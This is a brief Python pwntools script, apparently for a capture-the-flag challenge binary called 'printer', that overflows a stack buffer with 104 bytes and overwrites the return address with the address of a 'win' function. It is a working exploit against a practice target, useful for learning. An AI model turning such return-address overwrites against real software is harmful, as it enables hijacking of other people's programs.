import pwn

p = pwn.process('./printer')
# p = pwn.remote('localhost', 8080)

payload = b"A" * 104  # fill stack + ebp
payload += pwn.p32(0x80490bd)  # address of win (need to add )

p.sendline(payload)
print(p.recvall().decode())